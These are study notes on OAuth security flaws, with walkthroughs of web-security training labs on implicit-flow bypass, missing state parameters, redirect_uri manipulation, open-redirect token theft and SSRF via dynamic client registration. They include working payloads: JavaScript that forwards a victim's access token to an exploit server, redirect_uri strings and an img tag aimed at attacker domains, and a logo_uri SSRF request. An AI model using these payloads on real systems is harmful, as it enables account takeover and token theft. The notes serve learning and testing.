---
layout: default
title: "OAuth"
parent: "Web Application"
nav_order: 22
---


Two main "flows" - **authorization code** and **implicit**, both follow similar process:
1. Client application requests access to user's data
2. User prompted to sign in to the OAuth server and give consent
3. Client application receives a unique access token
4. Client application uses this access token to make API calls fetching the relevant data from the resource server

OAuth was *not originally intended for* authentication, but it's used that way now (think using Facebook to create an account)
- username is basically still email, but the login token is kind of like the password 

Recognizing when an application is using OAuth - *If you see an option to log in using your account from a different website*, OAuth is likely being used.
- First request of the flow will always be a request to the `/authorization` endpoint containing a number of query parameters that are used for OAuth. Ex: `client_id`, `redirect_uri`, and `response_type` parameters. 
	- For example:
	- `GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=token&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1`
	  `Host: oauth-authorization-server.com`

## Recon
Once you know the hostname of the authorization server, you should always try sending a `GET` request to the following standard endpoints:
- `/.well-known/oauth-authorization-server`
- `/.well-known/openid-configuration`

These will often return a JSON configuration file containing key information, such as details of additional features that may be supported. This will sometimes tip you off about a wider attack surface and supported features that may not be mentioned in the documentation.

## Vulnerabilities - Client Application

### Implicit Grant Type
The access token is sent from the OAuth service to the client application via the user's browser as a **URL fragment**. The client application then accesses the token using JavaScript. The trouble is, *if the application wants to maintain the session after the user closes the page, it needs to store the current user data (normally a user ID and the access token)* somewhere.
- Client application submits this data to the server in a `POST` request and then assigns the user a session cookie, effectively logging them in. Like login, but no secrets. 
- In the implicit flow, this `POST` request is exposed to attackers via their browser. As a result, this behavior can lead to a *serious vulnerability if the client application doesn't check that the access token matches the other data in the request*. Attacker can change parameters to match a user. 
### Lab: Authentication bypass via OAuth implicit flow
Go through the authentication process, following all of the requests and notice this one, change it to carlos and the email given:

```HTTP
POST /authenticate HTTP/2
Host: 0ae8007704fd2fc482201ba000630067.web-security-academy.net
Cookie: session=L9nCrwPH47w3PETOFQfb1F9lCzzUYxqb
Content-Length: 111

...

{
	"email":"carlos@carlos-montoya.net",
	"username":"carlos",
	"token":"cKKPfe_egd3aru_H80gDlLnEBn2jio1Ae6-_Bpvbw-e"
}
```

### Flawed CSRF protection
`state` parameter option but strongly recommended - should be unguessable, sort of operating as a CSRF token
- If the application doesn't use it, attacker can potentially initiate an OAuth flow themselves before tricking a user's browser into completing it

### Lab: Forced OAuth profile linking
`https://oauth-0ab700bf04a9c77f806c6f7f028f0027.oauth-server.net/.well-known/openid-configuration`

**Notice** the lack of `state` parameter. 

There are two sets of creds - one for the blog account and one for the social media account
- You log in with the blog account
- Then connect it with the social media account
- Viewing the requests shows a `GET /auth?client_id[...]` request - observe that the `redirect_uri` for this functionality sends the *authorization code* to `/oauth-linking`.
	- **This code can only be used once** so you need to drop a request, then use that code again for the PoC
- So the goal is to capture this request and send a CSRF PoC to the victim
- Then log in with the social media account


## Leaking Authorization Codes and Access Tokens
Depending on the grant type, either a code or token is sent via the victim's browser to the `/callback` endpoint specified in the `redirect_uri` parameter of the authorization request. 
- If the *OAuth service fails to validate this URI*, an attacker may be able to trick the victim's browser into initiating an OAuth flow that **will send the code or token to an attacker-controlled `redirect_uri`.**

**Authorization code flow** - attacker can potentially steal the victim's code before it is used. They can then send this code to the client application's legitimate `/callback` endpoint (the original `redirect_uri`) to get access to the user's account.
- In this scenario, an attacker does not even need to know the client secret or the resulting access token. As long as the victim has a valid session with the OAuth service, the client application will simply complete the code/token exchange on the attacker's behalf before logging them in to the victim's account.
- Note that using `state` or `nonce` protection does not necessarily prevent these attacks because an attacker can generate new values from their own browser.

More **redirect_uri** info:
- It can be validated in different ways, ex:
	- Some implementations allow for a range of subdirectories by checking only that the string starts with the correct sequence of characters i.e. an approved domain, so try *adding or removing arbitrary paths*. 
	- Append additional values to the `redirect_uri` parameter to exploit discrepancies between the parsing of the URI by the different components of the OAuth service
		- `https://default-host.com &@foo.evil-user.net#@bar.evil-user.net/`
		- Learn more with **SSRF** and **CORS**
	- Server-side parameter pollution variables
		- `https://oauth-authorization-server.com/?client_id=123&redirect_uri=client-app.com/callback&redirect_uri=evil-user.net` 
	- `localhost` may be treated differently, try `localhost.evil-user.net` for example
- Consider changing the other parameters as well
	- changing the `response_mode` from `query` to `fragment` can sometimes completely alter the parsing of the `redirect_uri`, allowing URIs that would be blocked
	- `web_message` response mode may allow a wider range of subdomains
### Lab: OAuth account hijacking via redirect_uri
The key is is the `redirect_uri` parameter being sent with the `GET /auth` request. **Duh.**
- You can set it to anything and it won't throw an error
- Set it to the [exploit server](https://exploit-0a47004d04a05a3681411ffb019f0033.exploit-server.net/exploit)
![](assets/Images/OAuth%20authentication/OAuth_redirect_uri.png)
- For whatever reason, the code did not show up in my log, and then all the requests did at once
	- Maybe this was because I failed to "Follow Redirection" in Burp (**Actually definitely**) so I sent a bunch of new code generation requests, and the requests did show up in the log, but only when I actually followed the redirection did the codes themselves show up

### Stealing codes and access tokens via a proxy page
- Try to access other pages within the client application
	- Ex: The default URI will often be on an OAuth-specific path, such as `/oauth/callback`. You may be able to use *directory traversal* tricks to supply an arbitrary path on the domain: 
		- `https://client-app.com/oauth/callback/../../example/path`
		- Could be interpreted as `https://client-app.com/example/path` on the back end. 
- Audit additional pages for vulnerabilities that you can potentially use to leak the code or token. For the [authorization code flow](https://portswigger.net/web-security/oauth/grant-types#authorization-code-grant-type), you need to find a vulnerability that gives you access to the query parameters, whereas for the [implicit grant type](https://portswigger.net/web-security/oauth/grant-types#implicit-grant-type), you need to extract the URL fragment.
- open redirect - You can use this as a proxy to forward victims, along with their code or token, to an attacker-controlled domain where you can host any malicious script you like
	- Note that for the *implicit grant type*, stealing an access token doesn't just enable you to log in to the victim's account on the client application, you can also use the token to make your own API calls to the OAuth service's resource server. This may enable you to fetch sensitive user data that you cannot normally access from the client application's web UI.

### Lab: Stealing OAuth access tokens via an open redirect
`https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit&response_type=token&nonce=399721827&scope=openid%20profile%20email`

This script leaks the parameter fragments by redirecting users to the exploit server for a second time with the access token as a query parameter instead:
```HTML
<script> 
	window.location = '/?'+document.location.hash.substr(1) 
</script>
```

This script forces the victim to visit the malicious URL and then executes the script to steal their access token:
```HTML
<script> 
	if (!document.location.hash) { 
		window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email' 
	} else { 
		window.location = '/?'+document.location.hash.substr(1) 
		} 
</script>
```


#### This lab required:
- Notice the `GET /auth?client_id=[...]` request has a `redirect_uri`
	- We should get used to trying directory traversal and different domains
	- But it won't work, we need to use the lab domain, and we can do that with a `/../`
	- **Also** the `client_id` will be in the request even after the directory traversal
		- **Good opportunity to recognize that the client_id is what we need, and we should find that first**
- Notice the open redirect on `/post/next?postId=2` from click `Next` within a blog post
	- We need to use this *open redirect* to redirect to our exploit server
- Then we need to forces the victim to visit your malicious URL and then executes the script you just tested to steal their access token. **Note the scripts above**, I wouldn't have been able to figure this part out I don't think. 
- Notice that the API key was on `oauth-0aa900b404bd810f80b7100f027800eb.oauth-server.net/me` after sign in. 
	- So we need to use the **access token** that we get from the log ion the `/me` endpoint 

Other ways to get the code or token: 
- Dangerous JS that handles query parameters and URL fragments
	- Ex: insecure web messaging scripts
- XSS vulnerabilities
- HTML injection vulnerabilities 
	- If you can point the `redirect_uri` parameter to a page on which you can inject your own HTML content, you might be able to leak the code via the `Referer` header. Ex:
		- `img` element: `<img src="evil-user.net">`. When attempting to fetch this image, some browsers send the full URL in the `Referer` header of the request, including the query string.

### Flawed scope validation 
- May be able to use a token fro more than the scope it is meant for
- [authorization code grant type](https://portswigger.net/web-security/oauth/grant-types#authorization-code-grant-type),- user's data is requested and sent via secure server-to-server communication. It may still be possible to manipulate registering their own client application with the OAuth service. 
- More [here](https://portswigger.net/web-security/oauth#flawed-scope-validation)

### Unverified User Registration
More info [here](https://portswigger.net/web-security/oauth#unverified-user-registration)

### Lab: SSRF via OpenID dynamic client registration

- `.well-known/openid-configuration` of the **OAuth server**
- Notice the *registration endpoint* located at `https://oauth-0a18008203f2d8d18411ed2c0224001d.oauth-server.net/reg`
- Register your client application with a `POST` request. Ex:
```HTTP
POST /reg HTTP/2
Host: oauth-0a40004804aefb598154af3f02380096.oauth-server.net
Content-Type: application/json
Content-Length: 67

{
    "redirect_uris" : [
        "https://example.com"
    ]
}
```
- This registers a new client application, and the response should give you a `client_id`
	- `zH8Kqax6rTVDCWKprrdTo`
- This `client_id` helps us to retrieve information which we can see in the `GET /client/<client_id>/logo`
- So we can put the resource we want in there and then call it from that endpoint
```HTTP
POST /reg HTTP/1.1 
Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net 
Content-Type: application/json 
{ 
	"redirect_uris" : [ 
		"https://example.com" 
	], 
	"logo_uri" : "https://BURP-COLLABORATOR-SUBDOMAIN" 
}
```


# Additional Reading
[Hidden OAuth attack vectors](https://portswigger.net/research/hidden-oauth-attack-vectors)
[OAuth grant types](https://portswigger.net/web-security/oauth/grant-types)

